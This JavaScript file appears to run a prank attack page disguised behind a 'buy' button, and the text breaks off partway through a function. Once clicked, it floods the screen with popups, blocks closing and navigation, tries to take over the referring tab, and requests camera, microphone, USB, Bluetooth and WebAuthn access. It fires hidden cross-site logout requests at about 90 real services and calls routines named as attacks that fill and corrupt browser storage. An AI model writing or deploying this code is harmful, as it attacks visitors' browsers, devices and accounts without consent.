const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = ['tung', 'tungtunghook', 'tungggggg', 'sahur']

const FILE_DOWNLOADS = [
  'media/bombo1.png',
  'media/bombo2.jpg',
  'media/bombo3.jpg'
]

const PHRASES = ['tung', 'tungtunghook', 'tungtung']

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', { provider: null, voip_provider: null }],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
  Roblox: ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
  Guilded: ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
  Reddit: ['POST', 'https://www.reddit.com/svc/shreddit/account/logout'], // added by @MARECKIyt
  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'], // added by @MARECKIyt
  Asana: ['POST', 'https://app.asana.com/app/asana/-/logout'], // added by @Hyd3r1
  Facebook: ['GET', 'https://www.facebook.com/logout.php'], // added by @ltj_
  Twitter: ['POST', 'https://twitter.com/logout'], // added by @ltj_
  Twitch: ['GET', 'https://www.twitch.org/logout'], // added by @ltj_
  TikTok: ['GET', 'https://www.tiktok.com/logout'], // added by @ltj_
  Bitbucket: ['GET', 'https://bitbucket.org/account/signout/'], // added by @ltj_
  GitLab: ['GET', 'https://gitlab.com/users/sign_out'], // added by @ltj_
  Slack: ['GET', 'https://slack.com/logout'], // added by @ltj_
  Discord_Web: ['GET', 'https://discord.com/logout'], // added by @ltj_
  Quora: ['POST', 'https://www.quora.com/logout'], // added by @ltj_
  Coursera: ['GET', 'https://www.coursera.org/logout'], // added by @ltj_
  Udemy: ['GET', 'https://www.udemy.com/user/logout/'], // added by @ltj_
  EpicGames: ['GET', 'https://www.epicgames.com/id/logout'], // added by @ltj_
  GOG: ['GET', 'https://www.gog.com/account/logout'], // added by @ltj_
  Origin: ['GET', 'https://www.origin.com/logout'], // added by @ltj_
  BattleNet: ['GET', 'https://battle.net/login/logout'], // added by @ltj_
  Nintendo: ['GET', 'https://accounts.nintendo.com/logout'], // added by @ltj_
  PocztaWP: ['GET', 'https://profil.wp.pl/wyloguj.html'], // added by @ltj_
  Ceneo: ['GET', 'https://www.ceneo.pl/konto/wyloguj'], // added by @ltj_
  Wykoppl: ['GET', 'https://wykop.pl/wyloguj'], // added by @ltj_
  AppleID: ['GET', 'https://appleid.apple.com/logout'], // added by @ltj_
  Adobe: ['GET', 'https://www.adobe.com/account/sign-out.html'], // added by @ltj_
  Canva: ['GET', 'https://www.canva.com/logout'], // added by @ltj_
  Figma: ['POST', 'https://www.figma.com/api/logout'], // added by @ltj_
  Medium: ['GET', 'https://medium.com/me/signout'], // added by @ltj_
  Uber: ['GET', 'https://auth.uber.com/logout'], // added by @ltj_
  Airbnb: ['GET', 'https://www.airbnb.com/logout'], // added by @ltj_
  Booking: ['GET', 'https://secure.booking.com/logout.html'], // added by @ltj_
  Expedia: ['GET', 'https://www.expedia.com/logout'], // added by @ltj_
  Patreon: ['GET', 'https://www.patreon.com/logout'], // added by @ltj_
  Behance: ['GET', 'https://www.behance.net/logout'], // added by @ltj_
  Dribbble: ['GET', 'https://dribbble.com/session'], // added by @ltj_
  Heroku: ['GET', 'https://id.heroku.com/logout'], // added by @ltj_
  DigitalOcean: ['GET', 'https://cloud.digitalocean.com/logout'], // added by @ltj_
  Cloudflare: ['GET', 'https://dash.cloudflare.com/logout'], // added by @ltj_
  DisneyPlus: ['GET', 'https://www.disneyplus.com/logout'], // added by @ltj_
  HBO_Max: ['GET', 'https://www.hbomax.com/logout'], // added by @ltj_
  Rakuten: ['GET', 'https://www.rakuten.com/logout.html'], // added by @ltj_
  Etsy: ['GET', 'https://www.etsy.com/logout.php'], // added by @ltj_
  Vinted: ['GET', 'https://www.vinted.pl/logout'], // added by @ltj_
  Zalando: ['GET', 'https://www.zalando.pl/logout/'], // added by @ltj_
  AliExpress: ['GET', 'https://login.aliexpress.com/page/logout.htm'], // added by @ltj_
  Badoo: ['GET', 'https://badoo.com/logout/'], // added by @ltj_
  Tinder: ['GET', 'https://tinder.com/logout'], // added by @ltj_
  OkCupid: ['GET', 'https://www.okcupid.com/logout'], // added by @ltj_
  Lastfm: ['GET', 'https://www.last.fm/logout'], // added by @ltj_
  Deezer: ['GET', 'https://www.deezer.com/logout'], // added by @ltj_
  Evernote: ['GET', 'https://www.evernote.com/Logout.action'], // added by @ltj_
  Notion: ['GET', 'https://www.notion.so/logout'], // added by @ltj_
  Zoom: ['GET', 'https://zoom.us/logout'], // added by @ltj_
  TeamViewer: ['GET', 'https://login.teamviewer.com/LogOn/LogOff'], // added by @ltj_
  Webex: ['GET', 'https://www.webex.com/logout.html'], // added by @ltj_
  ChudVision: ['GET', 'https://chudvision.net/api/auth/logout'],
  Neverlose: ['POST', 'https://neverlose.cc/logout'],
  Characterai: ['POST', 'https://character.ai/api/trpc/auth.logout?batch=1'],
}

const wins = []
let interactionCount = 0
const veryLongString = repeatStringNumTimes(repeatStringNumTimes('tungtunghooked ', 100), 1500)
let numSuperLogoutIframes = 0

const isChildWindow = (window.opener && isParentSameOrigin()) || window.location.search.indexOf('child=true') !== -1
const isParentWindow = !isChildWindow

init()

function init() {
  if (isChildWindow) {
    initChildWindow()
  } else {
    initParentWindow()
  }
}

function initChildWindow() {
  confirmPageUnload()
  startTheramin()
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  detectWindowClose()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()
  startWindowShaking()
  triggerFileDownload()
  startImage()
  fireAllStorageAttacks()
  fireAllCorruptionAttacks()

  setInterval(() => {
    openWindow()
  }, 3000)

  interceptUserInput(event => {
    if (interactionCount === 0) {
      startAlertInterval()
    }
    triggerPerClickPayload(event);
  })
}

function initParentWindow() {
  const buyBtn = document.getElementById('buy-btn');
  if (buyBtn) {
    buyBtn.addEventListener('click', function (event) {
      event.preventDefault();
      event.stopPropagation();

      if (interactionCount === 0) {
        confirmPageUnload()
        blockBackButton()
        fillHistory()
        registerProtocolHandlers()
        attemptToTakeoverReferrerWindow()
        hideCursor()
        startAlertInterval()
        superLogout()
        rainbowThemeColor()
        animateUrlWithEmojis()
        speak('hook')
        startImage()
        fireAllStorageAttacks()
        fireAllCorruptionAttacks()

        interceptUserInput(triggerPerClickPayload)
      }
      triggerPerClickPayload(event);
    });
  }
}

function interceptUserInput(handler) {
  document.body.addEventListener('touchstart', handler, { passive: false })
  document.body.addEventListener('mousedown', handler)
  document.body.addEventListener('mouseup', handler)
  document.body.addEventListener('click', handler)
  document.body.addEventListener('keydown', handler)
  document.body.addEventListener('keyup', handler)
  document.body.addEventListener('keypress', handler)
}

function triggerPerClickPayload(event) {
  interactionCount += 1

  if (event && event.preventDefault) {
    event.preventDefault()
    event.stopPropagation()
  }

  for (let i = 0; i < 5; i++) {
    openWindow()
  }

  triggerFileDownload()
  startVibrateInterval()
  focusWindows()
  copySpamToClipboard()
  speak()
  startTheramin()
  startMicFeedbackLoop()

  if (event.key === 'Meta' || event.key === 'Control') {
    window.print()
    requestWebauthnAttestation()
    window.print()
    requestWebauthnAttestation()
    window.print()
    requestWebauthnAttestation()
  } else {
    requestPointerLock()

    if (!window.ApplePaySession) {
      requestWebauthnAttestation()
    }
    requestClipboardRead()
    requestMidiAccess()
    requestBluetoothAccess()
    requestUsbAccess()
    requestSerialAccess()
    requestHidAccess()
    requestCameraAndMic()
    requestFullscreen()
  }
}

function attemptToTakeoverReferrerWindow() {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    try { window.opener.location = `${window.location.origin}/?child=true` } catch (e) { }
  }
}

function isParentSameOrigin() {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function confirmPageUnload() {
  window.addEventListener('beforeunload', event => {
    speak('Please don\'t go!')
    event.returnValue = true
  })
}

function registerProtocolHandlers() {
  if (typeof navigator.registerProtocolHandler !== 'function') return
  const protocolWhitelist = [
    'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms',
    'news', 'ircs', 'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn',
    'webcal', 'wtai', 'xmpp'
  ]
  const handlerUrl = window.location.href + '/url=%s'
  protocolWhitelist.forEach(proto => {
    try { navigator.registerProtocolHandler(proto, handlerUrl, 'tung') } catch (e) { }
  })
}

function requestCameraAndMic() {
  if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') return
  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')
    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]
    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)
      imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { })
    }, () => { })
  })
}

function animateUrlWithEmojis() {
  if (window.ApplePaySession) return
  const rand = Math.random()
  if (rand < 0.33) animateUrlWithBabies()
  else if (rand < 0.67) animateUrlWithWave()
  else animateUrlWithMoons()

  function animateUrlWithBabies() {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']
    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        let m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }
      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave() {
    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        let n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4
        s += String.fromCharCode(0x2581 + n)
      }
      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons() {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0
    setInterval(() => {
      let s = ''
      let x = 0
      if (!m) {
        while (d[x] === 4) x++
        if (x >= d.length) m = 1
        else d[x]++
      } else {
        while (d[x] === 0) x++
        if (x >= d.length) m = 0
        else {
          d[x]++
          if (d[x] === 8) d[x] = 0
        }
      }
      d.forEach(function (n) { s += f[n] })
      window.location.hash = s
    }, 100)
  }
}

function requestPointerLock() {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )
  if (requestPointerLockApi) { try { const p = requestPointerLockApi.call(document.body); if (p && p.catch) p.catch(() => { }) } catch (e) { } }
}

function startVibrateInterval() {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

function focusWindows() {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

function openWindow() {
  const { x, y } = getRandomCoords()
  const opts = `popup=yes,width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.href, '', opts)
  const win2 = window.open(window.location.href, '', opts)
  if (!win) return
  wins.push(win)
  if (win2) wins.push(win2)
  if (wins.length === 2) setupSearchWindow(win)

  win.onunload = function () { return false; };
  win.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "";
  });
  win.onbeforeunload = function () { return ""; };
}

function hideCursor() {
  const hugeCursor = 'url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3wEWEyQgX0qWwQAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAElElEQVR42u2cQWgcVRSGv3EzE1K1mCymkFhD0R5EEMFDUC+CqBehVEEQLYhgQUQQLSjowR5ELILgRlBoL0VQEA96EbEIgl4E0UNRD0EQQUQQLbQ1bS2xmtlk4j0m092Z2ZnZ2ZnZefO+7+HhLnP/mff/+9+bN0nDMAzDMAzDMAzDMAzDMAzDMAzDMAzDMErBEHAA2AnsB3qB2cAW4AJwHrgE/ApMAwOaH6N5O7AQOA/0Zz5uAAHgA+AoMAQYI/124AqwFxgGHgR+Ar4C5rVvR6X2o6u5zS0E/rO//wD41NbmIeAlYJ1D3/vAT8Ah4L8q+s2s7Ww3sBn4EbgA3AO8Cnzj0McRYBjYaTz+XvANsBU4Z+f/IeD7Avp8Bqwz7v+d4G5gD/CD/fy/gU8L6PMo0GE8/43gE6AjgP+w8/z2gvu8A6w2nv2N4EXgUODPnxX0ZzZ42Xjye4JXAn93qOA+V1tH2z/bE/wB+L/k/p5w727fCX28F/i/B0u4d5vxzD8Kbgz8z0jJfT42nvjB4IuA/50oqc/txhM/GFwS8J/jJfW513jhB4O3Av5zpKQ+txgv/GAwEfCfYyX1edx44QeDcwH/GS+pz2PGk2LgC8DqAv/aXlKf94wnPxgEA/VbJfX50HjiB4N3A393ooT7vG08aT04Efhz/y3hHncaTxwN9gT+bKCEe9xpPLEm2BH4owMlvPcB4LzxpPVgX+DP+ku4x73GE0uCHYE/uKeEezxiPHEw2Bv4g9tLuMedxhPXgx8Df7CnRPTxJ/CkZzwwWcItHjCeuBz4N9xL+u6+Evp73HjeemA8yO9YpA4j5nZjnqOAGeOJ68GTwJ7An01W3GeH2T1B/U3vF0s+hHlH8mngB+AeYCHwnxMl9fkD8B6ww2yPzE9R0wA2Am+Zp9L9v4I+n07T0fR32m2v2X14qH0PZusl48nvCWaB48A3OfV3L1wBvjXbfvA36nQz8CrwG3ABuA24B/gA+MmhjyO2n+1uHk/a20Y1t/g38Brwrf39+zBf4A4D7zv0vQ/41GzTwc8I3pB+R1dzk0/s75fN7hP7FwP3AJ+Y3Xlq/gV8AawBjjn0ccJst6/2bN+E6K01m0A3+Zrdg9XWd7t0X7Prn7eBfc52HnC3eS+oM/6N2v9+e9bLwNfAj2Y/pY+z/5uXgbfb9f1d43aUf3N2X44BtxvP/A2ZtJ+/y7aQh4wn/oZM2q/fZlvIC8YTf0O2Bf7nZomD90vAWeOJvyEHg/v9s13i4L1vPHE42BLcp7tS8P+Gf40nDgdbgvssuJmC/5eNJw4Hm4L7zK1kCf7PGU8cDjYF91lYyRL8nzeeOBxsCu7zqIIf3u1T7aW1wWb/B1cE91hdyRL8nzeeOBxsCu5zs8Rj2612s8rS2mBTcJ9u+72U/Xm4rXazypIaE2rA/5x2q92ssqTGlBrwn9NutZtVltSYUAP+57Rb7WaVJTVGZRiGYRiGYRiGYRiGYRiGYRiGYRiGYRiGuTf+BSf85e4oWqPzAAAAAElFTkSuQmCC"), auto'
  document.querySelector('html').style.cursor = hugeCursor

  document.querySelectorAll('*').forEach(el => {
    el.style.cursor = hugeCursor
  })
}

function speak(phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

let theraminStarted = false;

function startTheramin() {
  if (theraminStarted) return;
  theraminStarted = true;

  const audioContext = new (window.AudioContext || window.webkitAudioContext)()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 500 + Math.random() * 500
  const pitchRange = 4000 + Math.random() * 6000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)
  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)
  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 300
  }

  oscillator({ pitch: 0.5, volume: 1 })
  const resumeAudio = () => {
    if (audioContext.state === 'suspended') audioContext.resume()
  }
  window.addEventListener('mousemove', resumeAudio, { once: true })
  window.addEventListener('click', resumeAudio, { once: true })
  window.addEventListener('keydown', resumeAudio, { once: true })

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

function requestClipboardRead() {
  try {
    navigator.clipboard.readText().then(
      data => { },
      () => { }
    )
  } catch { }
}

function requestWebauthnAttestation() {
  try {
    const createCredentialDefaultArgs = {
      publicKey: {
        rp: { name: 'Acme' },
        user: {
          id: new Uint8Array(16),
          name: 'tungtunghook',
          displayName: 'XD XD'
        },
        pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
        attestation: 'direct',
        timeout: 60000,
        challenge: new Uint8Array([
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }
    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        challenge: new Uint8Array([
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
        getCredentialDefaultArgs.publicKey.allowCredentials = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        return navigator.credentials.get(getCredentialDefaultArgs)
      }).catch(() => { })
  } catch { }
}

function requestMidiAccess() {
  try { navigator.requestMIDIAccess({ sysex: true }) } catch { }
}

function requestBluetoothAccess() {
  try {
    navigator.bluetooth.requestDevice({ acceptAllDevices: true })
      .then(device => device.gatt.connect()).catch(() => { })
  } catch { }
}

function requestUsbAccess() {
  try { navigator.usb.requestDevice({ filters: [{}] }).catch(() => { }) } catch { }
}

function requestSerialAccess() {
  try { navigator.serial.requestPort({ filters: [] }).catch(() => { }) } catch { }
}

function requestHidAccess() {
  try { navigator.hid.requestDevice({ filters: [] }).catch(() => { }) } catch { }
}

function moveWindowBounce() {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight
    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

function startWindowShaking() {
  setInterval(() => {
    const rx = (Math.random() - 0.5) * 50
    const ry = (Math.random() - 0.5) * 50
    window.moveBy(rx, ry)
    window.resizeTo(WIN_WIDTH + rx, WIN_HEIGHT + ry)
  }, 50)
}

function detectWindowClose() {
  window.addEventListener('unload', () => {
    if (window.opener && !window.opener.closed) window.opener.onCloseWindow(window)
  })
}

window.onCloseWindow = function (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

function rainbowThemeColor() {
  function zeroFill(width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }
  const meta = document.querySelector('meta.theme-color')
  if (!meta) return;
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}

function copySpamToClipboard() {
  clipboardCopy(veryLongString)
}

function clipboardCopy(text) {
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre'

  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()
  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) { }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

function startAlertInterval() {
  setInterval(() => {
    if (Math.random() < 0.5) showAlert()
    else window.print()
  }, 30000)
}

function showAlert() {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

function requestFullscreen() {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen
  if (requestFullscreen) { try { const p = requestFullscreen.call(document.body); if (p && p.catch) p.catch(() => { }) } catch (e) { } }
}

async function superLogout() {
  function cleanup(el, delayCleanup) {
    if (delayCleanup) return
    if (el.parentNode) el.parentNode.removeChild(el)
  }

  function get(url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style.cssText = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post(url, params) {
    const iframe = document.createElement('iframe')
    iframe.style.cssText = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style.cssText = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }

  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `triple t logging you out of ${name}...`

    let logoutMessages = document.querySelector('.logout-messages')
    if (!logoutMessages) {
      logoutMessages = document.createElement('div');
      logoutMessages.className = 'logout-messages';
      document.body.appendChild(logoutMessages);
    }
    logoutMessages.appendChild(div)
    
    // Add a slight delay to bypass the browser's multiple form submission cancellation feature
    await new Promise(r => setTimeout(r, 150))
  }
}

function blockBackButton() {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory() {
  const baseUrl = window.location.href.split('?')[0];
  for (let i = 1; i < 20; i++) {
    try { window.history.pushState({}, '', baseUrl + '?q=' + i) } catch (e) { }
  }
  try { window.history.pushState({}, '', baseUrl) } catch (e) { }
}

function getRandomCoords() {
  const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

function getRandomArrayEntry(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function setupSearchWindow(win) {
  if (!win) return
  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      try { win.window.location = window.location.href } catch (e) { }
      return
    }
    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }
    try { win.window.location = window.location.href } catch (e) { }
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      try { if (!win.closed) win.moveTo(x, y) } catch (e) { }
      try { if (!win.closed) win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex]) } catch (e) { }
      searchIndex += 1
    }, 500)
  }, 2500)
}

function startImage() {
  if (FILE_DOWNLOADS.length === 0) return
  const img = document.createElement('img')
  img.src = getRandomArrayEntry(FILE_DOWNLOADS)
  img.style.position = 'fixed'
  img.style.top = '0'
  img.style.left = '0'
  img.style.width = '100vw'
  img.style.height = '100vh'
  img.style.zIndex = '-1'
  img.style.objectFit = 'cover'
  document.body.appendChild(img)
}

function fireAllStorageAttacks() {
  fillLocalStorage()
  fillSessionStorage()
  fillIndexedDB()
  fillCacheStorage()
  fillOriginPrivateFileSystem()
  fillWebSQL()
  accumulateBlobUrls()
}

function fireAllCorruptionAttacks() {
  floodServiceWorkerRegistrations()
  corruptCookieJarStorm()
  corruptIndexedDBWAL()
  corruptOPFSChurn()
  corruptCacheChurn()
  bloatHistoryState()
}

function triggerFileDownload() {
  if (FILE_DOWNLOADS.length === 0) return
  setInterval(() => {
